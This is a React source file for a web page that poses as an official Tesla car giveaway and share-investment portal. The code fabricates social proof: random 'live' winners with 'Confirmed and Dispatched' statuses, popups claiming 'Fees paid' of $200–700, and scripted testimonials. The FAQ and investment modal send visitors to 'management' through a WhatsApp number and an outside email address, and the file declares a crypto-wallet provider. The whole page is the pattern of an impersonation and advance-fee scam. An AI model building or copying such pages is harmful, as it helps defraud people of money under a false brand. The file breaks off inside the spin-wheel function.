import React, { useState, useEffect, useRef, useContext } from 'react';
import { motion } from 'motion/react';
import confetti from 'canvas-confetti';
import { Transaction, CarOption } from './types';

import img1 from '../assets/images/Model s.png';
import img2 from '../assets/images/Model X.png';
import img3 from '../assets/images/Model 3.png';
import img4 from '../assets/images/Model Y.png';
import img5 from '../assets/images/The truck.png';
import img6 from '../assets/images/Home-charger(1).png';

import testImg1 from '../assets/images/Jutta.jpeg';
import testImg2 from '../assets/images/Mark.jpeg';
import testImg3 from '../assets/images/Annette.jpeg';
import testImg4 from '../assets/images/Shelby.jpeg';
import investBg from '../assets/images/Copy-of.jpg';

// Add global definition for Ethereum provider
declare global {
  interface Window {
    ethereum: any;
  }
}

// --- Theme Context ---
const ThemeContext = React.createContext<{ isDark: boolean; toggleTheme: () => void }>({
  isDark: true,
  toggleTheme: () => {},
});

const useTheme = () => useContext(ThemeContext);

// --- Constants & Data ---

const CAR_OPTIONS: CarOption[] = [
  { id: 'S_PLAID', name: 'Model S', model: 'Plaid', color: 'text-red-500', image: img1 },
  { id: 'X_PLAID', name: 'Model X', model: 'Plaid', color: 'text-blue-500', image: img2 },
  { id: '3_PERF', name: 'Model 3', model: 'Performance', color: 'text-purple-500', image: img3 },
  { id: 'Y_PERF', name: 'Model Y', model: 'Performance', color: 'text-teal-500', image: img4 },
  { id: 'CYBER', name: 'Cybertruck', model: 'Cyberbeast', color: 'text-gray-400', image: img5 },
  { id: 'CHARGER', name: 'Wall Connector', model: 'Home Charger', color: 'text-gray-300', image: img6 },
];

const NAV_LINKS = [
  { label: 'Home', href: '#section1', icon: 'fa-home' },
  { label: 'Prizes', href: '#section2', icon: 'fa-car' },
];

const FAQS = [
  { question: "How do I get my car?", answer: "You have to Contact management to claim your prize." },
  { question: "Is there a limit to how many cars I can get?", answer: "Each user get only one prize each.." },
  { question: "When do I get my car?", answer: "Delivery time depends on Location." },
];

const TESTIMONIALS = [
  {
    id: 1,
    name: "Jutta",
    location: "Austin, TX",
    car: "Model S Plaid",
    testimony: "I couldn't believe it when I got the call! The process was incredibly smooth, and the car was delivered right to my driveway. This is truly a dream come true.",
    image: testImg1,
  },
  {
    id: 2,
    name: "Mark",
    location: "Seattle, WA",
    car: "Model X Plaid",
    testimony: "Best decision I ever made. I spun the wheel and within 24 hours they were arranging delivery. Unbelievable experience!",
    image: testImg2,
  },
  {
    id: 3,
    name: "Annette",
    location: "Munich, Germany",
    car: "Model 3 Performance",
    testimony: "I've always wanted a Tesla but thought it was out of reach. This event made it possible. The team was so helpful and the car is absolutely stunning.",
    image: testImg3,
  },
  {
    id: 4,
    name: "Shelby",
    location: "Denver, CO",
    car: "Cybertruck",
    testimony: "Got my Cybertruck! The whole neighborhood came out to see it when it was delivered. The transparency of this giveaway is what convinced me to enter.",
    image: testImg4,
  }
];

// --- Icons ---


// --- Helper Functions ---

const generateRandomTransaction = (): Transaction => {
  const cars = ['Model S', 'Model X', 'Model 3', 'Model Y', 'Cybertruck', 'Wall Connector'];
  const car = cars[Math.floor(Math.random() * cars.length)];
    
  const names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Jamie', 'Avery'];
  const name = names[Math.floor(Math.random() * names.length)];
  const initial = String.fromCharCode(65 + Math.floor(Math.random() * 26));
  
  const rand = Math.random();
  let status: 'Confirmed and Dispatched' | 'Pending' | 'Processing' = 'Confirmed and Dispatched';
  if (rand > 0.9) status = 'Pending';
  else if (rand > 0.8) status = 'Processing';

  const locations = [
    { loc: 'New York, US', flag: 'us' },
    { loc: 'London, UK', flag: 'gb' },
    { loc: 'Toronto, CA', flag: 'ca' },
    { loc: 'Sydney, AU', flag: 'au' },
    { loc: 'Berlin, DE', flag: 'de' },
    { loc: 'Paris, FR', flag: 'fr' },
    { loc: 'Tokyo, JP', flag: 'jp' },
    { loc: 'Dubai, AE', flag: 'ae' },
    { loc: 'Singapore, SG', flag: 'sg' },
    { loc: 'Mumbai, IN', flag: 'in' }
  ];
  const locationData = locations[Math.floor(Math.random() * locations.length)];
  
  return {
    id: Math.random().toString(36).substr(2, 9),
    location: locationData.loc,
    flag: locationData.flag,
    user: `${name} ${initial}.`,
    car,
    time: status === 'Confirmed and Dispatched' ? 'Just now' : 'Confirming...',
    status: status
  };
};

const handleSmoothScroll = (e: React.MouseEvent<HTMLAnchorElement | HTMLButtonElement>, href: string) => {
  e.preventDefault();
  const targetId = href.replace('#', '');
  const element = document.getElementById(targetId);
  if (element) {
    element.scrollIntoView({
      behavior: 'smooth',
      block: 'start',
    });
  }
};

// --- Custom Hooks ---

const useIntersectionObserver = (options = {}) => {
  const elementRef = useRef<HTMLDivElement>(null);
  const [isVisible, setIsVisible] = useState(false);

  useEffect(() => {
    const observer = new IntersectionObserver(([entry]) => {
      if (entry.isIntersecting) {
        setIsVisible(true);
        if (elementRef.current) observer.unobserve(elementRef.current);
      }
    }, { threshold: 0.1, ...options });

    if (elementRef.current) observer.observe(elementRef.current);
    return () => observer.disconnect();
  }, [options]);

  return [elementRef, isVisible] as const;
};

// --- Components ---

const ScrollProgress: React.FC = () => {
  const [width, setWidth] = useState(0);

  useEffect(() => {
    const handleScroll = () => {
      const docHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
      const scrollPos = window.scrollY;
      const progress = (scrollPos / docHeight) * 100;
      setWidth(progress);
    };

    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  return (
    <div className="fixed top-0 left-0 h-1 bg-gradient-to-r from-red-600 to-orange-500 z-[100] transition-all duration-150 ease-out" style={{ width: `${width}%` }}></div>
  );
};

const ScrollToTop: React.FC = () => {
  const [visible, setVisible] = useState(false);
  const { isDark } = useTheme();

  useEffect(() => {
    const toggleVisibility = () => {
      if (window.scrollY > 300) {
        setVisible(true);
      } else {
        setVisible(false);
      }
    };

    window.addEventListener('scroll', toggleVisibility);
    return () => window.removeEventListener('scroll', toggleVisibility);
  }, []);

  const scrollToTop = () => {
    window.scrollTo({
      top: 0,
      behavior: 'smooth',
    });
  };

  return (
    <button
      onClick={scrollToTop}
      className={`fixed bottom-8 right-8 z-40 p-3 rounded-full shadow-2xl transition-all duration-300 transform hover:scale-110 focus:outline-none ${
        visible ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-10 pointer-events-none'
      } ${isDark ? 'bg-red-600 text-white hover:bg-red-500' : 'bg-black text-white hover:bg-gray-800'}`}
    >
      <i className="fas fa-arrow-up"></i>
    </button>
  );
};

const RevealOnScroll: React.FC<{ 
  children: React.ReactNode, 
  className?: string, 
  delay?: number, 
  id?: string,
  direction?: 'up' | 'down' | 'left' | 'right' 
}> = ({ children, className = "", delay = 0, id, direction = 'up' }) => {
  const [ref, isVisible] = useIntersectionObserver();
  
  const getTransform = () => {
    if (isVisible) return 'translate-x-0 translate-y-0 opacity-100 blur-0 scale-100';
    switch(direction) {
      case 'up': return 'translate-y-20 opacity-0 blur-sm scale-95';
      case 'down': return '-translate-y-20 opacity-0 blur-sm scale-95';
      case 'left': return '-translate-x-20 opacity-0 blur-sm scale-95';
      case 'right': return 'translate-x-20 opacity-0 blur-sm scale-95';
      default: return 'translate-y-20 opacity-0 blur-sm';
    }
  };

  return (
    <div 
      ref={ref} 
      id={id}
      className={`transition-all duration-1000 ease-[cubic-bezier(0.22,1,0.36,1)] transform will-change-transform ${getTransform()} ${className}`}
      style={{ transitionDelay: `${delay}ms` }}
    >
      {children}
    </div>
  );
};

const Navbar: React.FC = () => {
  const [isOpen, setIsOpen] = useState(false);
  const [scrolled, setScrolled] = useState(false);
  const { isDark, toggleTheme } = useTheme();

  useEffect(() => {
    const handleScroll = () => setScrolled(window.scrollY > 20);
    window.addEventListener('scroll', handleScroll);
    return () => window.removeEventListener('scroll', handleScroll);
  }, []);

  return (
    <nav className={`fixed w-full z-50 transition-all duration-500 ${scrolled ? (isDark ? 'bg-black/90 border-b border-gray-800' : 'bg-white/90 border-b border-gray-200 shadow-sm') + ' backdrop-blur-md py-3' : 'bg-transparent py-6'}`}>
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
        <div className="flex justify-between items-center">
          <div className="flex-shrink-0 cursor-pointer group" onClick={() => window.scrollTo({ top: 0, behavior: 'smooth' })}>
             <div className="flex items-center gap-2">
                <svg className={`h-6 md:h-8 w-auto fill-current transition-colors duration-300 group-hover:text-red-500 ${isDark ? 'text-white' : 'text-black'}`} viewBox="0 0 342 35" xmlns="http://www.w3.org/2000/svg">
                  <path d="M0 .1a9.7 9.7 0 0 0 7 7h11l.5.1v27.6h6.8V7.3L26 7h11a9.8 9.8 0 0 0 7-7H0zm238.6 0h-6.8v34.8H263a9.7 9.7 0 0 0 6-6.8h-30.3V0zm-52.3 6.8c3.6-1 6.6-3.8 7.4-6.9l-38.1.1v20.6h31.1v7.2h-24.4a13.6 13.6 0 0 0-8.7 7h39.9v-21h-31.2v-7zm116.2 28h6.7v-14h24.6v14h6.7v-21h-38zM85.3 7h26a9.6 9.6 0 0 0 7.1-7H78.3a9.6 9.6 0 0 0 7 7m0 13.8h26a9.6 9.6 0 0 0 7.1-7H78.3a9.6 9.6 0 0 0 7 7m0 14.1h26a9.6 9.6 0 0 0 7.1-7H78.3a9.6 9.6 0 0 0 7 7M308.5 7h26a9.6 9.6 0 0 0 7-7h-40a9.6 9.6 0 0 0 7 7"></path>
                </svg>
                <span className="text-red-600 font-bold text-xs uppercase tracking-widest hidden sm:block border-l border-gray-700 pl-2 ml-2">Event Portal</span>
             </div>
          </div>
          <div className="hidden md:flex items-center gap-8">
            <div className="flex items-center space-x-8">
              {NAV_LINKS.map((link) => (
                <a key={link.label} href={link.href} onClick={(e) => handleSmoothScroll(e, link.href)} className={`group relative text-sm font-medium transition-colors flex items-center gap-2 py-2 ${isDark ? 'text-gray-300 hover:text-white' : 'text-gray-600 hover:text-black'}`}>
                  <i className={`fas ${link.icon} ${isDark ? 'text-gray-500' : 'text-gray-400'} group-hover:text-red-500 transition-colors`}></i>{link.label}
                  <span className="absolute bottom-0 left-0 w-0 h-0.5 bg-red-600 transition-all duration-300 group-hover:w-full"></span>
                </a>
              ))}
            </div>
            <div className="flex items-center space-x-3">
              <button onClick={toggleTheme} className={`w-10 h-10 rounded-full flex items-center justify-center transition-all ${isDark ? 'bg-gray-800 text-yellow-400' : 'bg-gray-100 text-gray-800'}`} title="Toggle Theme"><i className={`fas ${isDark ? 'fa-sun' : 'fa-moon'}`}></i></button>
            </div>
          </div>
          <div className="md:hidden">
            <button onClick={() => setIsOpen(!isOpen)} className={`${isDark ? 'text-white' : 'text-black'} p-2`}>
              <i className={`fas ${isOpen ? 'fa-times' : 'fa-bars'} text-2xl`}></i>
            </button>
          </div>
        </div>
      </div>

      {/* Mobile Menu Dropdown */}
      {isOpen && (
        <div className={`md:hidden absolute top-full left-0 w-full border-b shadow-lg ${isDark ? 'bg-black/95 border-gray-800' : 'bg-white/95 border-gray-200'} backdrop-blur-md`}>
          <div className="px-4 pt-2 pb-6 space-y-1 flex flex-col">
            {NAV_LINKS.map((link) => (
              <a 
                key={link.label} 
                href={link.href} 
                onClick={(e) => {
                  handleSmoothScroll(e, link.href);
                  setIsOpen(false);
                }} 
                className={`block px-3 py-4 rounded-md text-base font-medium flex items-center gap-3 ${isDark ? 'text-gray-300 hover:bg-gray-800 hover:text-white' : 'text-gray-700 hover:bg-gray-100 hover:text-black'}`}
              >
                <i className={`fas ${link.icon} w-5 text-center ${isDark ? 'text-gray-500' : 'text-gray-400'}`}></i>
                {link.label}
              </a>
            ))}
            <div className={`mt-4 pt-4 border-t flex items-center justify-between px-3 ${isDark ? 'border-gray-800' : 'border-gray-200'}`}>
              <span className={`text-sm font-medium ${isDark ? 'text-gray-400' : 'text-gray-500'}`}>Change theme</span>
              <button 
                onClick={() => {
                  toggleTheme();
                  setIsOpen(false);
                }} 
                className={`w-10 h-10 rounded-full flex items-center justify-center transition-all ${isDark ? 'bg-gray-800 text-yellow-400' : 'bg-gray-100 text-gray-800'}`} 
                title="Toggle Theme"
              >
                <i className={`fas ${isDark ? 'fa-sun' : 'fa-moon'}`}></i>
              </button>
            </div>
          </div>
        </div>
      )}
    </nav>
  );
};

const PrizeCard: React.FC<{ car: CarOption }> = ({ car }) => {
  const { isDark } = useTheme();

  return (
    <div className={`p-6 rounded-2xl border transition-all ${isDark ? 'bg-[#0a0a0a] border-gray-800' : 'bg-white border-gray-200 shadow-md'}`}>
      <div className="relative h-64 rounded-xl overflow-hidden group">
        <img src={car.image} alt={`${car.name} ${car.model}`} className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-110" referrerPolicy="no-referrer" />
        <div className="absolute inset-0 bg-gradient-to-t from-black/80 to-transparent flex items-end p-4">
            <div>
                <h3 className="font-bold text-2xl text-white">{car.name}</h3>
                <span className={`text-sm font-semibold ${car.color}`}>{car.model}</span>
            </div>
        </div>
      </div>
    </div>
  );
};

const HistoryTable: React.FC = () => {
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const { isDark } = useTheme();

  useEffect(() => {
    setTransactions(Array.from({ length: 5 }).map(generateRandomTransaction));
    const interval = setInterval(() => {
      setTransactions(prev => [generateRandomTransaction(), ...prev.slice(0, 7)]);
    }, 2500);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className={`rounded-2xl border overflow-hidden shadow-2xl ${isDark ? 'bg-[#0a0a0a] border-gray-800' : 'bg-white border-gray-200'}`}>
      <div className={`grid grid-cols-2 md:grid-cols-3 gap-4 p-6 border-b ${isDark ? 'border-gray-800 bg-gray-900/20' : 'border-gray-200 bg-gray-50'}`}>
        <div className="text-center"><div className={`text-2xl font-bold ${isDark ? 'text-white' : 'text-gray-900'}`}>150K+</div><div className="text-xs text-gray-500 uppercase mt-1">Total Spins</div></div>
        <div className="text-center"><div className={`text-2xl font-bold ${isDark ? 'text-white' : 'text-gray-900'}`}>5,247</div><div className="text-xs text-gray-500 uppercase mt-1">Winners</div></div>
        <div className="text-center"><div className="text-2xl font-bold text-blue-500">24/7</div><div className="text-xs text-gray-500 uppercase mt-1">Support</div></div>
      </div>
      {/* Desktop Table */}
      <div className="hidden md:block overflow-x-auto">
        <table className="w-full min-w-[800px] text-left text-sm whitespace-nowrap">
          <thead className={`text-xs uppercase ${isDark ? 'bg-black text-gray-500' : 'bg-gray-50 text-gray-600'}`}><tr className="border-b border-gray-800">
            <th className="p-5 font-medium">Location</th><th className="p-5 font-medium">Participant</th><th className="p-5 font-medium">Prize Won</th><th className="p-5 font-medium">Status</th><th className="p-5 text-right">Time</th>
          </tr></thead>
          <tbody className={`divide-y ${isDark ? 'divide-gray-800' : 'divide-gray-100'}`}>
            {transactions.map((tx) => (
              <tr key={tx.id} className={`${isDark ? 'hover:bg-gray-800/30' : 'hover:bg-gray-50'}`}>
                <td className="p-5 font-medium text-xs">
                  <div className="flex items-center gap-3">
                    <img src={`https://flagcdn.com/w20/${tx.flag}.png`} srcSet={`https://flagcdn.com/w40/${tx.flag}.png 2x`} alt="flag" className="w-5 h-auto shadow-sm rounded-sm" referrerPolicy="no-referrer" />
                    <span>{tx.location}</span>
                  </div>
                </td>
                <td className="p-5 font-medium">{tx.user}</td>
                <td className="p-5 font-medium text-green-500 font-bold">{tx.car}</td>
                <td className="p-5"><span className={`text-[10px] font-bold px-2 py-1 rounded-full ${tx.status === 'Confirmed and Dispatched' ? 'text-green-500 bg-green-500/10' : 'text-yellow-500 bg-yellow-500/10'}`}>{tx.status}</span></td>
                <td className="p-5 text-right text-gray-500 font-mono text-xs">{tx.time}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      {/* Mobile Cards */}
      <div className="block md:hidden">
        <div className={`divide-y ${isDark ? 'divide-gray-800' : 'divide-gray-100'}`}>
          {transactions.map((tx) => (
            <div key={tx.id} className={`p-4 ${isDark ? 'hover:bg-gray-800/30' : 'hover:bg-gray-50'}`}>
              <div className="flex justify-between items-start mb-2">
                <div className="flex items-center gap-2">
                  <img src={`https://flagcdn.com/w20/${tx.flag}.png`} srcSet={`https://flagcdn.com/w40/${tx.flag}.png 2x`} alt="flag" className="w-5 h-auto shadow-sm rounded-sm" referrerPolicy="no-referrer" />
                  <span className="font-medium text-sm">{tx.user}</span>
                </div>
                <span className="text-gray-500 font-mono text-xs">{tx.time}</span>
              </div>
              <div className="flex justify-between items-center">
                <div className="font-medium text-green-500 font-bold text-sm">{tx.car}</div>
                <span className={`text-[10px] font-bold px-2 py-1 rounded-full ${tx.status === 'Confirmed and Dispatched' ? 'text-green-500 bg-green-500/10' : 'text-yellow-500 bg-yellow-500/10'}`}>{tx.status}</span>
              </div>
              <div className="text-xs text-gray-500 mt-2">{tx.location}</div>
            </div>
          ))}
        </div>
      </div>
    </div>
  );
};

const FAQSection: React.FC = () => {
  const [openIndex, setOpenIndex] = useState<number | null>(0);
  const { isDark } = useTheme();
  return (
    <div className="space-y-4">
      {FAQS.map((faq, idx) => (
        <div key={idx} className={`border rounded-xl overflow-hidden ${isDark ? 'bg-[#0a0a0a] border-gray-800' : 'bg-white border-gray-200'}`}>
          <button className="w-full p-5 text-left flex justify-between items-center" onClick={() => setOpenIndex(openIndex === idx ? null : idx)}>
            <span className={`font-semibold ${openIndex === idx ? (isDark ? 'text-white' : 'text-gray-900') : 'text-gray-500'}`}>{faq.question}</span>
            <i className={`fas fa-chevron-down text-gray-500 transition-transform ${openIndex === idx ? 'rotate-180' : ''}`}></i>
          </button>
          {openIndex === idx && <div className="p-5 pt-0 text-gray-400 text-sm leading-relaxed border-t border-gray-800/50 mt-2 animate-fadeIn">{faq.answer}</div>}
        </div>
      ))}
    </div>
  );
};

const WINNER_NAMES = ["James T.", "Sarah M.", "Michael B.", "Emma W.", "David L.", "Sophia R.", "Daniel K.", "Olivia P.", "Noah J.", "Ava C."];
const WINNER_CARS = ["Model S Plaid", "Model X Plaid", "Model 3 Performance", "Model Y Performance", "Cybertruck Cyberbeast", "Wall Connector"];

const WinnerPopup: React.FC = () => {
  const [winner, setWinner] = useState<{name: string, car: string, fee: number} | null>(null);
  const [visible, setVisible] = useState(false);
  const { isDark } = useTheme();

  useEffect(() => {
    const showNextWinner = () => {
      const name = WINNER_NAMES[Math.floor(Math.random() * WINNER_NAMES.length)];
      const car = WINNER_CARS[Math.floor(Math.random() * WINNER_CARS.length)];
      const fee = Math.floor(Math.random() * 500) + 200; // Random fee between $200 and $700

      setWinner({ name, car, fee });
      setVisible(true);

      setTimeout(() => {
        setVisible(false);
      }, 5000); // Show for 5 seconds
    };

    // Initial delay before first popup
    const initialTimer = setTimeout(showNextWinner, 4000);

    // Repeat every 12 seconds (5s visible + 7s hidden)
    const interval = setInterval(showNextWinner, 12000);

    return () => {
      clearTimeout(initialTimer);
      clearInterval(interval);
    };
  }, []);

  return (
    <div className={`fixed bottom-4 left-4 z-[100] transition-all duration-700 transform ${visible ? 'translate-y-0 opacity-100' : 'translate-y-10 opacity-0 pointer-events-none'}`}>
      {winner && (
        <div className={`p-6 rounded-2xl border shadow-2xl flex items-start gap-5 w-80 md:w-96 ${isDark ? 'bg-[#111] border-gray-800 text-white' : 'bg-white border-gray-200 text-gray-900'}`}>
          <div className="w-12 h-12 rounded-full bg-green-500/20 flex items-center justify-center shrink-0 mt-1">
            <i className="fas fa-check text-green-500 text-xl"></i>
          </div>
          <div>
            <h4 className="font-bold text-base mb-1.5">{winner.name} won a {winner.car}!</h4>
            <p className={`text-sm mb-2 ${isDark ? 'text-gray-400' : 'text-gray-600'}`}>
              Car confirmed and dispatched.
            </p>
            <p className="text-sm font-semibold text-green-500">
              Fees paid: ${winner.fee}
            </p>
          </div>
        </div>
      )}
    </div>
  );
};

const MainContent: React.FC = () => {
    const { isDark } = useTheme();
    const [showInvestModal, setShowInvestModal] = useState(false);

    return (
        <div className={`min-h-screen font-sans overflow-x-hidden ${isDark ? 'bg-black text-white' : 'bg-gray-50 text-gray-900'}`}>
        <ScrollProgress />
        <ScrollToTop />
        <Navbar />
        <WinnerPopup />

        <main className="pt-20">
            <section id="section1" className="relative min-h-[90vh] flex items-center justify-center py-20 px-4 group overflow-hidden">
              <div className="absolute inset-0 z-0"><div className="absolute inset-0 bg-[url('https://images.unsplash.com/photo-1560958089-b8a1929cea89?q=80&w=2071&auto=format&fit=crop')] bg-cover bg-center opacity-70 transform scale-105 transition-transform duration-1000 group-hover:scale-110"></div><div className={`absolute inset-0 bg-gradient-to-b ${isDark ? 'from-black/70 via-black/20 to-black' : 'from-white/80 via-white/30 to-gray-50'}`}></div></div>
              <div className="max-w-5xl mx-auto text-center relative z-10">
                <RevealOnScroll className="mb-6"><span className="bg-red-600/20 text-red-500 text-xs font-bold px-6 py-2 rounded-full border border-red-600/30 uppercase tracking-[0.2em]">Official Event Live</span></RevealOnScroll>
                <RevealOnScroll delay={200}><h1 className="text-5xl md:text-7xl lg:text-8xl font-black mb-8 tracking-tighter uppercase">WIN YOUR <br/><span className="text-transparent bg-clip-text bg-gradient-to-r from-red-500 to-orange-500">DREAM TESLA</span></h1></RevealOnScroll>
                <RevealOnScroll delay={400}><p className="text-lg md:text-2xl mb-10 leading-relaxed max-w-3xl mx-auto font-light">Join the ultimate Tesla giveaway event. Simply spin the wheel for a chance to win your dream car. The giveaway is open to everyone in all countries. It's that easy!</p></RevealOnScroll>
                <RevealOnScroll delay={600} className="flex flex-col sm:flex-row justify-center gap-6 mb-16">
                    <button onClick={(e) => handleSmoothScroll(e as any, '#spin-wheel')} className="bg-red-600 hover:bg-red-700 text-white font-bold py-4 px-10 rounded-full text-lg shadow-xl shadow-red-900/40">Spin to Win</button>
                    <button onClick={(e) => handleSmoothScroll(e as any, '#section2')} className={`border font-bold py-4 px-10 rounded-full text-lg ${isDark ? 'bg-white/5 border-white/10 text-white' : 'bg-white/50 border-gray-200 text-gray-900'}`}>View Prizes</button>
                </RevealOnScroll>
                <div className="grid grid-cols-2 md:grid-cols-4 gap-4 pt-8 border-t border-white/10">
                    {[{l:"Cars Available", v:"6"}, {l:"Participants", v:"15k+"}, {l:"Draw Date", v:"Live"}, {l:"Status", v:"Active"}].map((s,i) => (
                        <div key={i} className="text-center"><div className={`text-2xl font-black ${s.l === 'Status' ? 'text-green-500 animate-pulse' : ''}`}>{s.v}</div><div className="text-[10px] text-gray-500 uppercase tracking-widest">{s.l}</div></div>
                    ))}
                </div>
              </div>
            </section>

            <section id="spin-wheel" className={`py-24 px-4 ${isDark ? 'bg-gray-900/50' : 'bg-gray-100'}`}>
              <div className="max-w-4xl mx-auto">
                <SpinWheel cars={CAR_OPTIONS} />
              </div>
            </section>

            <section id="section2" className={`py-24 px-4 ${isDark ? 'bg-black' : 'bg-gray-50'}`}><div className="max-w-7xl mx-auto"><div className="text-center mb-16"><span className="text-red-500 font-bold tracking-widest text-xs uppercase mb-2 block">Grand Prizes</span><h2 className="text-4xl md:text-5xl font-bold">Prizes You Could Win</h2></div><div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8">{CAR_OPTIONS.map((c) => <PrizeCard key={c.id} car={c} />)}</div></div></section>

            <section id="testimonials" className={`py-24 px-4 border-t ${isDark ? 'bg-[#0a0a0a] border-gray-900' : 'bg-white border-gray-200'}`}>
              <div className="max-w-7xl mx-auto">
                <div className="text-center mb-16">
                  <span className="text-red-500 font-bold tracking-widest text-xs uppercase mb-2 block">Success Stories</span>
                  <h2 className="text-4xl md:text-5xl font-bold">Real People, Real Teslas</h2>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
                  {TESTIMONIALS.map((testimonial) => (
                    <div key={testimonial.id} className={`rounded-2xl overflow-hidden border transition-transform hover:-translate-y-2 duration-300 flex flex-col ${isDark ? 'bg-black border-gray-800' : 'bg-gray-50 border-gray-200'}`}>
                      <img src={testimonial.image} alt={testimonial.name} className="w-full h-56 object-cover" referrerPolicy="no-referrer" />
                      <div className="p-6 flex flex-col h-full">
                        <div className="flex items-center gap-2 mb-3">
                          <i className="fas fa-star text-yellow-500 text-sm"></i>
                          <i className="fas fa-star text-yellow-500 text-sm"></i>
                          <i className="fas fa-star text-yellow-500 text-sm"></i>
                          <i className="fas fa-star text-yellow-500 text-sm"></i>
                          <i className="fas fa-star text-yellow-500 text-sm"></i>
                        </div>
                        <p className={`text-sm italic mb-6 leading-relaxed flex-grow ${isDark ? 'text-gray-300' : 'text-gray-600'}`}>"{testimonial.testimony}"</p>
                        <div className="border-t border-gray-200 dark:border-gray-800 pt-4 mt-auto">
                          <h4 className="font-bold text-sm">{testimonial.name}</h4>
                          <p className="text-xs text-gray-500">{testimonial.location}</p>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </section>

            <section id="section3" className={`py-24 px-4 border-y ${isDark ? 'bg-gray-900/10 border-gray-900' : 'bg-white'}`}><div className="max-w-7xl mx-auto"><h2 className="text-3xl font-bold mb-10">Live Entries</h2><HistoryTable /></div></section>

            <section id="section4" className={`py-24 px-4 ${isDark ? 'bg-black' : 'bg-gray-50'}`}><div className="max-w-7xl mx-auto grid grid-cols-1 lg:grid-cols-2 gap-16"><div><h2 className="text-3xl font-bold mb-8">FAQ</h2><FAQSection /></div><div id="section5"><h2 className="text-3xl font-bold mb-8">Invest in Tesla (TSLA)</h2><div className={`p-8 rounded-2xl border text-center relative overflow-hidden ${isDark ? 'bg-[#0a0a0a] border-gray-800' : 'bg-white border-gray-200 shadow-lg'}`} style={{ backgroundImage: `url(${investBg})`, backgroundSize: 'cover', backgroundPosition: 'center' }}><div className="absolute inset-0 bg-black/60 z-0"></div><div className="relative z-10"><div className="w-24 h-24 rounded-full mx-auto mb-6 bg-blue-500/20 backdrop-blur-sm flex items-center justify-center text-4xl border border-blue-500/30"><i className="fas fa-chart-line text-blue-400"></i></div><h3 className="text-2xl font-bold mb-2 text-white">Own the Future</h3><p className="text-gray-300 text-sm mb-6 px-4">Join millions of investors accelerating the world's transition to sustainable energy. Invest in TSLA today.</p><button onClick={() => setShowInvestModal(true)} className="inline-block px-8 py-3 rounded-full font-bold text-white bg-blue-600 hover:bg-blue-700 transition-colors shadow-lg shadow-blue-900/20">Buy TSLA Shares</button></div></div></div></div></section>
        </main>
        <footer className={`py-8 px-4 pb-12 ${isDark ? 'bg-black text-[#d2d2d7]' : 'bg-white text-[#5e5e5e]'}`}>
            <div className="max-w-7xl mx-auto flex flex-wrap justify-center items-center gap-x-4 md:gap-x-6 gap-y-3 text-[12px] font-medium tracking-wide">
                <span className="cursor-pointer hover:text-black dark:hover:text-white transition-colors">Tesla &copy; 2026</span>
                <a href="#" className="cursor-pointer hover:text-black dark:hover:text-white transition-colors">News</a>
                <a href="#" className="cursor-pointer hover:text-black dark:hover:text-white transition-colors">Get Updates</a>
            </div>
        </footer>

        {/* Invest Modal */}
        {showInvestModal && (
          <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 animate-fadeIn" style={{ position: 'fixed' }}>
            <div className={`relative w-full max-w-md p-8 rounded-3xl shadow-2xl border ${isDark ? 'bg-[#111] border-gray-800' : 'bg-white border-gray-200'} text-center`}>
              <button 
                onClick={() => setShowInvestModal(false)}
                className="absolute top-4 right-4 text-gray-400 hover:text-gray-200 transition-colors"
              >
                <i className="fas fa-times text-xl"></i>
              </button>
              
              <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-blue-500/20 flex items-center justify-center">
                <i className="fas fa-chart-line text-4xl text-blue-500"></i>
              </div>
              
              <h3 className="text-2xl font-black mb-2 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-blue-600">
                Invest in TSLA
              </h3>
              
              <p className={`mb-6 ${isDark ? 'text-gray-300' : 'text-gray-600'}`}>
                To proceed with purchasing TSLA shares or for investment inquiries, please contact management directly.
              </p>
              
              <div className="flex flex-col gap-3">
                <a 
                  href={`https://wa.me/447498713979?text=${encodeURIComponent(`Hello Management! I am interested in investing in TSLA shares. How do I proceed?`)}`}
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full py-4 rounded-xl font-bold text-white bg-[#25D366] hover:bg-[#20bd5a] transition-colors flex items-center justify-center gap-2 shadow-lg shadow-green-900/20"
                >
                  <i className="fab fa-whatsapp text-xl"></i>
                  Contact via WhatsApp
                </a>
                
                <a 
                  href={`mailto:teslamanagement@addrin.uk?subject=${encodeURIComponent(`Inquiry: Investing in TSLA Shares`)}&body=${encodeURIComponent(`Hello Management!\n\nI am interested in purchasing TSLA shares.\n\nHow do I proceed with the investment?\n\nThank you!`)}`}
                  className={`w-full py-4 rounded-xl font-bold transition-colors flex items-center justify-center gap-2 border ${isDark ? 'bg-gray-800 hover:bg-gray-700 border-gray-700 text-white' : 'bg-gray-100 hover:bg-gray-200 border-gray-300 text-gray-900'}`}
                >
                  <i className="fas fa-envelope text-xl"></i>
                  Contact via Email
                </a>
              </div>
            </div>
          </div>
        )}
        </div>
    );
};

const SpinWheel: React.FC<{ cars: CarOption[] }> = ({ cars }) => {
  const [isSpinning, setIsSpinning] = useState(false);
  const [rotation, setRotation] = useState(0);
  const [winner, setWinner] = useState<CarOption | null>(null);
  const [showModal, setShowModal] = useState(false);
  const [previousWinners, setPreviousWinners] = useState<Set<string>>(new Set());
  const { isDark } = useTheme();

  const spin = () => {
    if (isSpinning) return;
    
    setIsSpinning(true);
    setWinner(null);
    setShowModal(false);
    
    // Find available indices that haven't been won yet
    let availableIndices = cars.map((_, index) => index).filter(index => !previousWinners.has(cars[index].id));
    
    // If all cars have been won, reset the pool
    if (availableIndices.length === 0) {
      availableIndices = cars.map((_, index) => index);
      setPreviousWinners(new Set());
    }
    
    // Select a random index from the available ones
    const randomIndex = Math.floor(Math.random() * availableIndices.length);
